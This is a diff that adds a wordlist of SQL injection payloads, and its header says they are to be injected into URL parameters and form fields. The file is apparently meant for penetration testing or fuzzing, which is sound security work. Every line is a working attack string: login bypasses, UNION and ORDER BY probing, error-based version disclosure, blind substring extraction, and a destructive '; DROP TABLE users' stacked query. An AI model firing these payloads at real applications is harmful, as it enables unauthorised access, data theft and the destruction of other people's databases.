@@ -1,0 +1,22 @@
+# SQL Injection Test Payloads
+# Each line is one payload to inject into URL parameters and form fields
+' OR '1'='1
+' OR '1'='1' --
+" OR "1"="1
+' OR 1=1 --
+' OR 1=1#
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT 1,2,3--
+1' ORDER BY 1--
+1' ORDER BY 10--
+'; DROP TABLE users--
+' AND 1=CONVERT(int,(SELECT @@version))--
+1 AND 1=1
+1 OR 1=1
+' OR ''='
+admin'--
+1; SELECT * FROM users
+' OR 'x'='x
+')) OR (('1'='1
+' AND SUBSTRING(username,1,1)='a'--
